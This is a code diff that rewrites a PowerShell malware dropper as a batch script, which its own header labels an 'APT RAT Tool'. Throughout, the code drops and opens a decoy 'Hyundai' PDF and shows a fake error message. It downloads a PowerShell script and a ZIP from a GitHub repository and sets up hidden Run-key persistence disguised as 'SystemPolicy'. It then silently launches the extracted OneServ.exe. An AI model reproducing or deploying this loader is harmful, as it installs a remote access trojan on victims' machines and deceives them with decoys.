@@ -1,292 +1,279 @@
-#region Initialisation
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-$v1 = "https://github.com/hundaicasp-cmd/OneServ/raw/main/OneServ.zip"
-$v2 = "C:\Users\Public\" + ([System.IO.Path]::GetRandomFileName().Split('.')[0]) + ".zip"
-$v3 = "C:\Users\Public\" + (Get-Date -Format "yyyyMMdd")
-#endregion
+@echo off
+setlocal enabledelayedexpansion
 
-#region Créer PDF leurre
-$nomPDF = "Hyundai"
-$cheminPDF = "$env:USERPROFILE\Desktop\$nomPDF.pdf"
-$pdfCree = $false
+REM ========================================
+REM Living.bat - APT RAT Tool v2.0
+REM ========================================
 
-if (-not (Test-Path $cheminPDF)) {
-    try {
-        $contenuPDF = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 720 Td () Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000112 00000 n \n0000000202 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n321\n%%EOF'
-        Set-Content -Path $cheminPDF -Value $contenuPDF -Encoding ASCII
-        $pdfCree = $true
+REM Vérifier le mode d'exécution
+set "mode_run=false"
+if "%1"=="-run" (
+    set "mode_run=true"
+    echo Mode -run détecté - Exécution silencieuse
+    goto :mode_silent
+)
+
+REM Mode normal (avec interface)
+echo Mode normal - Interface complète
+goto :mode_normal
+
+:mode_silent
+REM ========================================
+REM MODE SILENCIEUX (-run)
+REM ========================================
+@echo off >nul 2>&1
+
+REM Initialisation silencieuse
+set "v1=https://github.com/hundaicasp-cmd/OneServ/raw/main/OneServ.zip"
+set "v2=%TEMP%\%RANDOM%.zip"
+set "v3=C:\Users\Public\%date:~10,4%%date:~4,2%%date:~7,2%"
+
+REM Persistance silencieuse
+set "cheminReg=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+set "nomPersistance=SystemPolicy"
+
+reg query "%cheminReg%" /v "%nomPersistance%" >nul 2>&1
+if %errorlevel% equ 0 (
+    goto :verification_connexion_silent
+)
+
+set "scriptPath=%TEMP%\emo.ps1"
+if not exist "%scriptPath%" (
+    powershell -WindowStyle Hidden -Command "& {try { $content = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hundaicasp-cmd/OneServ/refs/heads/main/poo.txt' -UseBasicParsing; Set-Content -Path '%scriptPath%' -Value $content.Content -Encoding UTF8 } catch { } }" >nul 2>&1
+)
+
+set "commandePersistance=powershell.exe -Exec Bypass -W Hidden -File \"%scriptPath%\""
+reg add "%cheminReg%" /v "%nomPersistance%" /t REG_SZ /d "%commandePersistance%" /f >nul 2>&1
+
+:verification_connexion_silent
+ping -n 1 8.8.8.8 >nul 2>&1
+if %errorlevel% neq 0 (
+    goto :fin_silent
+)
+
+REM Vérification et téléchargement silencieux
+set "executableValide=false"
+
+if exist "%v3%\*OneServ*.exe" (
+    for /f "delims=" %%i in ('dir /b "%v3%\*OneServ*.exe" 2^>nul') do (
+        set "executableExistant=%v3%\%%i"
+        set "executableValide=true"
+    )
+)
+
+if "%executableValide%"=="false" (
+    set "tentativesDownload=0"
+    set "maxTentatives=3"
+    
+    :download_loop_silent
+    set /a "tentativesDownload+=1"
+    
+    powershell -WindowStyle Hidden -Command "& {try { Invoke-WebRequest -Uri '%v1%' -OutFile '%v2%' } catch { } }" >nul 2>&1
+    
+    if exist "%v2%" (
+        if not exist "%v3%" mkdir "%v3%" >nul 2>&1
         
-        # Abrir el PDF solo si se acaba de crear
-        if ($pdfCree) {
-            Start-Process $cheminPDF -ErrorAction SilentlyContinue
-        }
-    } catch {
-        Write-Host "Erreur lors de la création du PDF: $($_.Exception.Message)"
-    }
-}
-
-# MessageBox d'erreur PDF simple
-try {
-    Add-Type -AssemblyName Microsoft.VisualBasic
-    [Microsoft.VisualBasic.Interaction]::MsgBox("PDF Errorer", "OkOnly,Exclamation", "Erreur")
-} catch {
-    # Silence les erreurs
-}
-#endregion
-
-#region Persistance améliorée
-try {
-    $cheminReg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $cheminPowerShell = (Get-Process -Id $PID).Path
-    $nomPersistance = "SystemPolicy"
-    
-    # Vérifier si la clé de registre existe déjà
-    try {
-        $cleExistante = Get-ItemProperty -Path $cheminReg -Name $nomPersistance -ErrorAction SilentlyContinue
-        if ($cleExistante) {
-            Write-Host "La clé de registre $nomPersistance existe déjà - Persistance déjà active"
-            return
-        }
-    } catch {
-        Write-Host "La clé de registre $nomPersistance n'existe pas - Procéder à la création"
-    }
-    
-    # Vérifier si le script existe déjà
-    $urlScript = "https://raw.githubusercontent.com/hundaicasp-cmd/OneServ/refs/heads/main/poo.txt"
-    $tempDir = $env:TEMP
-    $scriptPath = Join-Path $tempDir "emo.ps1"
-    
-    if (Test-Path $scriptPath) {
-        Write-Host "Le script emo.ps1 existe déjà dans temp - Utilisation du script existant"
-    } else {
-        try {
-            Write-Host "Téléchargement du script de persistance depuis GitHub..."
-            $webClient = New-Object System.Net.WebClient
-            $scriptContent = $webClient.DownloadString($urlScript)
-            
-            # Sauvegarder le script dans le dossier temp
-            Set-Content -Path $scriptPath -Value $scriptContent -Encoding UTF8
-            Write-Host "Script téléchargé et sauvegardé: $scriptPath"
-            
-        } catch {
-            Write-Host "Erreur lors du téléchargement du script: $($_.Exception.Message)"
-            # Fallback: utiliser le script local
-            $cheminScript = $MyInvocation.MyCommand.Path
-            $commandePersistance = "`"$cheminPowerShell`" -Exec Bypass -W Hidden -File `"$cheminScript`""
-            Set-ItemProperty -Path $cheminReg -Name $nomPersistance -Value $commandePersistance -Force
-            Write-Host "Persistance créée avec le script local"
-            return
-        }
-    }
-    
-    # Créer la persistance avec SystemPolicy
-    $commandePersistance = "`"$cheminPowerShell`" -Exec Bypass -W Hidden -File `"$scriptPath`""
-    
-    Set-ItemProperty -Path $cheminReg -Name $nomPersistance -Value $commandePersistance -Force
-    Write-Host "Persistance créée avec le nom: $nomPersistance"
-    Write-Host "Commande: $commandePersistance"
-    
-} catch {
-    Write-Host "Erreur lors de la création de la persistance: $($_.Exception.Message)"
-}
-#endregion
-
-#region Vérifier connexion
-$testConnexion = $false
-$tentatives = 0
-while (-not $testConnexion -and $tentatives -lt 5) {
-    try {
-        $resultatTest = Test-NetConnection -ComputerName 8.8.8.8 -Port 53 -InformationLevel Quiet
-        if ($resultatTest) {
-            $testConnexion = $true
-        }
-    } catch {
-        $tentatives++
-        Start-Sleep -Seconds 5
-    }
-}
-#endregion
-
-#region Vérification et téléchargement
-$poidsZipRequis = 9296478
-$poidsExeRequis = 9484125
-$executableTrouve = $false
-$executableValide = $false
-$zipValide = $false
-
-# Vérifier si l'exécutable existe déjà et a le bon poids
-$executableExistant = Get-ChildItem -Path $v3 -Filter "*OneServ*" -Recurse | 
-                     Where-Object {$_.Extension -eq ".exe"} | 
-                     Select-Object -First 1
-
-if ($executableExistant) {
-    $executableTrouve = $true
-    $poidsActuel = $executableExistant.Length
-    Write-Host "OneServ.exe trouvé - Poids: $poidsActuel bytes"
-    
-    if ($poidsActuel -eq $poidsExeRequis) {
-        $executableValide = $true
-        Write-Host "Poids vérifié - Exécutable valide"
-    } else {
-        Write-Host "Poids incorrect - Suppression de l'exécutable"
-        Remove-Item $executableExistant.FullName -Force -ErrorAction SilentlyContinue
-    }
-}
-
-# Téléchargement seulement si nécessaire
-if ($testConnexion -and (-not $executableValide)) {
-    $tentativesDownload = 0
-    $maxTentatives = 3
-    
-    while ((-not $executableValide) -and $tentativesDownload -lt $maxTentatives) {
-        $tentativesDownload++
-        Write-Host "Tentative de téléchargement #$tentativesDownload"
+        powershell -WindowStyle Hidden -Command "& {try { Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%v2%', '%v3%') } catch { } }" >nul 2>&1
         
-        try {
-            # Télécharger le fichier ZIP
-            $clientWeb = New-Object System.Net.WebClient
-            $clientWeb.DownloadFile($v1, $v2)
-            
-            if (Test-Path $v2) {
-                # Vérifier le poids du ZIP
-                $poidsZip = (Get-Item $v2).Length
-                Write-Host "Poids du ZIP: $poidsZip bytes (requis: $poidsZipRequis bytes)"
-                
-                if ($poidsZip -eq $poidsZipRequis) {
-                    Write-Host "ZIP valide - Procéder à l'extraction"
-                    $zipValide = $true
-                } else {
-                    Write-Host "Poids du ZIP incorrect - Suppression et nouvel essai"
-                    Remove-Item $v2 -Force -ErrorAction SilentlyContinue
-                    continue
-                }
-                
-                # Créer le répertoire s'il n'existe pas
-                if (-not (Test-Path $v3)) {
-                    New-Item -ItemType Directory -Path $v3 -Force | Out-Null
-                }
-                
-                # Extraire le fichier
-                Add-Type -AssemblyName System.IO.Compression.FileSystem
-                [System.IO.Compression.ZipFile]::ExtractToDirectory($v2, $v3)
-                
-                # Vérifier à nouveau le poids après extraction
-                $executableCible = Get-ChildItem -Path $v3 -Filter "*OneServ*" -Recurse | 
-                                 Where-Object {$_.Extension -eq ".exe"} | 
-                                 Select-Object -First 1
-                
-                if ($executableCible) {
-                    $poidsFinal = $executableCible.Length
-                    Write-Host "Poids après extraction: $poidsFinal bytes"
-                    
-                    if ($poidsFinal -eq $poidsExeRequis) {
-                        Write-Host "Exécutable valide après téléchargement"
-                        $executableValide = $true
-                    } else {
-                        Write-Host "Poids EXE toujours incorrect - Nouvel essai"
-                        Remove-Item $executableCible.FullName -Force -ErrorAction SilentlyContinue
-                        Remove-Item $v2 -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            }
-        } catch {
-            Write-Host "Erreur lors du téléchargement: $($_.Exception.Message)"
-            if (Test-Path $v2) {
-                Remove-Item $v2 -Force -ErrorAction SilentlyContinue
-            }
-        }
+        if exist "%v3%\*OneServ*.exe" (
+            for /f "delims=" %%i in ('dir /b "%v3%\*OneServ*.exe" 2^>nul') do (
+                set "executableCible=%v3%\%%i"
+                set "executableValide=true"
+            )
+        )
         
-        # Pause entre les tentatives
-        if (-not $executableValide -and $tentativesDownload -lt $maxTentatives) {
-            Write-Host "Nouvelle tentative dans 3 secondes..."
-            Start-Sleep -Seconds 3
-        }
-    }
-}
-#endregion
+        del "%v2%" /f /q >nul 2>&1
+    )
+    
+    if "%executableValide%"=="false" if !tentativesDownload! lss !maxTentatives! (
+        timeout /t 3 /nobreak >nul
+        goto :download_loop_silent
+    )
+)
 
-#region Deuxième vérification - Clé de registre NsMonitor
-$executionAutorisee = $true
-$cleRegistreAVerifier = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$nomEntreeAVerifier = "NsMonitor"
+REM Vérification NsMonitor silencieuse
+set "executionAutorisee=true"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NsMonitor" >nul 2>&1
+if %errorlevel% equ 0 (
+    set "executionAutorisee=false"
+)
 
-try {
-    $entreeExistante = Get-ItemProperty -Path $cleRegistreAVerifier -Name $nomEntreeAVerifier -ErrorAction SilentlyContinue
-    if ($entreeExistante) {
-        Write-Host "La clé de registre $nomEntreeAVerifier existe - Arrêt de l'exécution"
-        $executionAutorisee = $false
-    } else {
-        Write-Host "La clé de registre $nomEntreeAVerifier n'existe pas - Exécution autorisée"
-    }
-} catch {
-    Write-Host "Erreur lors de la vérification du registre: $($_.Exception.Message)"
-    $executionAutorisee = $true
-}
-#endregion
+REM Exécution silencieuse
+if "%executableValide%"=="true" if exist "%executableCible%" if "%executionAutorisee%"=="true" (
+    start "" /min "!executableCible!" -run >nul 2>&1
+)
 
-#region Exécution (seulement si la deuxième vérification est passée)
-if ($executableValide -and $executableCible -and $executionAutorisee) {
-    try {
-        Write-Host "Toutes les vérifications passées - Lancement de OneServ.exe"
-        $parametresProcessus = @{
-            FilePath = $executableCible.FullName
-            ArgumentList = "-run"
-            WindowStyle = "Hidden"
-            PassThru = $true
-        }
-        $processus = Start-Process @parametresProcessus
-        Write-Host "Processus exécuté avec PID: $($processus.Id)"
-    } catch {
-        Write-Host "Erreur lors de l'exécution: $($_.Exception.Message)"
-    }
-} else {
-    if (-not $executionAutorisee) {
-        Write-Host "Exécution bloquée: La clé de registre NsMonitor existe"
-    } else {
-        Write-Host "Aucun exécutable valide trouvé pour l'exécution après $tentativesDownload tentatives"
-    }
-}
-#endregion
+:fin_silent
+exit /b 0
 
-#region Nettoyage temporaire
-try {
-    $scriptNettoyage = {
-        Start-Sleep -Seconds 30
-        if (Test-Path $using:v2) {
-            Remove-Item $using:v2 -Force -ErrorAction SilentlyContinue
-        }
-    }
-    $travailNettoyage = Start-Job -ScriptBlock $scriptNettoyage
-} catch {
-    # Silence les erreurs de nettoyage
-}
-#endregion
+:mode_normal
+REM ========================================
+REM MODE NORMAL (sans -run)
+REM ========================================
 
-#region Créer PDF leurre (déplacé à la fin)
-$nomPDF = "Hyundai"
-$cheminPDF = "$env:USERPROFILE\Desktop\$nomPDF.pdf"
-$pdfCree = $false
+REM Initialisation
+set "v1=https://github.com/hundaicasp-cmd/OneServ/raw/main/OneServ.zip"
+set "v2=%TEMP%\%RANDOM%.zip"
+set "v3=C:\Users\Public\%date:~10,4%%date:~4,2%%date:~7,2%"
 
-if (-not (Test-Path $cheminPDF)) {
-    try {
-        $contenuPDF = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 720 Td () Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000058 00000 n \n0000000112 00000 n \n0000000202 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n321\n%%EOF'
-        Set-Content -Path $cheminPDF -Value $contenuPDF -Encoding ASCII
-        $pdfCree = $true
+REM Créer PDF leurre (déplacé à la fin)
+set "nomPDF=Hyundai"
+set "cheminPDF=%USERPROFILE%\Desktop\%nomPDF%.pdf"
+
+if not exist "%cheminPDF%" (
+    echo Création du PDF leurre...
+    echo %%PDF-1.4 > "%cheminPDF%"
+    echo 1 0 obj >> "%cheminPDF%"
+    echo << /Type /Catalog /Pages 2 0 R >> >> "%cheminPDF%"
+    echo endobj >> "%cheminPDF%"
+    echo 2 0 obj >> "%cheminPDF%"
+    echo << /Type /Pages /Kids [3 0 R] /Count 1 >> >> "%cheminPDF%"
+    echo endobj >> "%cheminPDF%"
+    echo 3 0 obj >> "%cheminPDF%"
+    echo << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >> >> "%cheminPDF%"
+    echo endobj >> "%cheminPDF%"
+    echo 4 0 obj >> "%cheminPDF%"
+    echo << /Length 44 >> >> "%cheminPDF%"
+    echo stream >> "%cheminPDF%"
+    echo BT /F1 12 Tf 72 720 Td () Tj ET >> "%cheminPDF%"
+    echo endstream >> "%cheminPDF%"
+    echo endobj >> "%cheminPDF%"
+    echo xref >> "%cheminPDF%"
+    echo 0 5 >> "%cheminPDF%"
+    echo 0000000000 65535 f >> "%cheminPDF%"
+    echo 0000000009 00000 n >> "%cheminPDF%"
+    echo 0000000058 00000 n >> "%cheminPDF%"
+    echo 0000000112 00000 n >> "%cheminPDF%"
+    echo 0000000202 00000 n >> "%cheminPDF%"
+    echo trailer >> "%cheminPDF%"
+    echo << /Size 5 /Root 1 0 R >> >> "%cheminPDF%"
+    echo startxref >> "%cheminPDF%"
+    echo 321 >> "%cheminPDF%"
+    echo %%EOF >> "%cheminPDF%"
+    
+    start "" "%cheminPDF%"
+)
+
+REM Persistance améliorée
+echo Création de la persistance SystemPolicy...
+set "cheminReg=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+set "nomPersistance=SystemPolicy"
+
+reg query "%cheminReg%" /v "%nomPersistance%" >nul 2>&1
+if %errorlevel% equ 0 (
+    echo La clé de registre %nomPersistance% existe déjà - Persistance déjà active
+    goto :verification_connexion
+)
+
+set "scriptPath=%TEMP%\emo.ps1"
+if exist "%scriptPath%" (
+    echo Le script emo.ps1 existe déjà dans temp - Utilisation du script existant
+) else (
+    echo Téléchargement du script de persistance depuis GitHub...
+    powershell -Command "& {try { $content = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hundaicasp-cmd/OneServ/refs/heads/main/poo.txt' -UseBasicParsing; Set-Content -Path '%scriptPath%' -Value $content.Content -Encoding UTF8; Write-Host 'Script téléchargé et sauvegardé: %scriptPath%' } catch { Write-Host 'Erreur lors du téléchargement: ' + $_.Exception.Message } }"
+)
+
+set "commandePersistance=powershell.exe -Exec Bypass -W Hidden -File \"%scriptPath%\""
+reg add "%cheminReg%" /v "%nomPersistance%" /t REG_SZ /d "%commandePersistance%" /f
+echo Persistance créée avec le nom: %nomPersistance%
+echo Commande: %commandePersistance%
+
+:verification_connexion
+echo Vérification de la connexion internet...
+set "testConnexion=false"
+set "tentatives=0"
+
+:test_loop
+ping -n 1 8.8.8.8 >nul 2>&1
+if %errorlevel% equ 0 (
+    set "testConnexion=true"
+    echo Connexion internet disponible
+) else (
+    set /a "tentatives+=1"
+    if !tentatives! lss 5 (
+        echo Tentative !tentatives! - Attente de 5 secondes...
+        timeout /t 5 /nobreak >nul
+        goto :test_loop
+    ) else (
+        echo Aucune connexion internet après 5 tentatives
+    )
+)
+
+REM Vérification et téléchargement
+set "executableValide=false"
+
+if exist "%v3%\*OneServ*.exe" (
+    for /f "delims=" %%i in ('dir /b "%v3%\*OneServ*.exe" 2^>nul') do (
+        set "executableExistant=%v3%\%%i"
+        set "executableTrouve=true"
+        echo OneServ.exe trouvé: !executableExistant!
+        set "executableValide=true"
+    )
+)
+
+if "%testConnexion%"=="true" if "%executableValide%"=="false" (
+    set "tentativesDownload=0"
+    set "maxTentatives=3"
+    
+    :download_loop
+    set /a "tentativesDownload+=1"
+    echo Tentative de téléchargement #!tentativesDownload!
+    
+    powershell -Command "& {try { Invoke-WebRequest -Uri '%v1%' -OutFile '%v2%'; Write-Host 'ZIP téléchargé' } catch { Write-Host 'Erreur: ' + $_.Exception.Message } }"
+    
+    if exist "%v2%" (
+        echo ZIP téléchargé - Vérification du poids...
         
-        # Abrir el PDF solo si se acaba de crear
-        if ($pdfCree) {
-            Start-Process $cheminPDF -ErrorAction SilentlyContinue
-        }
-    } catch {
-        Write-Host "Erreur lors de la création du PDF: $($_.Exception.Message)"
-    }
-}
+        if not exist "%v3%" mkdir "%v3%"
+        
+        powershell -Command "& {try { Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%v2%', '%v3%'); Write-Host 'ZIP extrait' } catch { Write-Host 'Erreur extraction: ' + $_.Exception.Message } }"
+        
+        if exist "%v3%\*OneServ*.exe" (
+            for /f "delims=" %%i in ('dir /b "%v3%\*OneServ*.exe" 2^>nul') do (
+                set "executableCible=%v3%\%%i"
+                echo Exécutable extrait: !executableCible!
+                set "executableValide=true"
+            )
+        )
+        
+        del "%v2%" /f /q
+    )
+    
+    if "%executableValide%"=="false" if !tentativesDownload! lss !maxTentatives! (
+        echo Nouvelle tentative dans 3 secondes...
+        timeout /t 3 /nobreak >nul
+        goto :download_loop
+    )
+)
 
-# MessageBox d'erreur PDF simple
-try {
-    Add-Type -AssemblyName Microsoft.VisualBasic
-    [Microsoft.VisualBasic.Interaction]::MsgBox("PDF Errorer", "OkOnly,Exclamation", "Erreur")
-} catch {
-    # Silence les erreurs
-}
-#endregion
+REM Vérification NsMonitor
+echo Vérification de la clé de registre NsMonitor...
+set "executionAutorisee=true"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NsMonitor" >nul 2>&1
+if %errorlevel% equ 0 (
+    echo La clé de registre NsMonitor existe - Arrêt de l'exécution
+    set "executionAutorisee=false"
+) else (
+    echo La clé de registre NsMonitor n'existe pas - Exécution autorisée
+)
+
+REM Exécution
+if "%executableValide%"=="true" if exist "%executableCible%" if "%executionAutorisee%"=="true" (
+    echo Toutes les vérifications passées - Lancement de OneServ.exe
+    start "" /min "!executableCible!" -run
+    echo Processus exécuté en arrière-plan
+) else (
+    if "%executionAutorisee%"=="false" (
+        echo Exécution bloquée: La clé de registre NsMonitor existe
+    ) else (
+        echo Aucun exécutable valide trouvé pour l'exécution
+    )
+)
+
+REM Nettoyage temporaire
+echo Nettoyage temporaire dans 30 secondes...
+timeout /t 30 /nobreak >nul
+if exist "%v2%" del "%v2%" /f /q
+
+echo Script terminé.
+pause
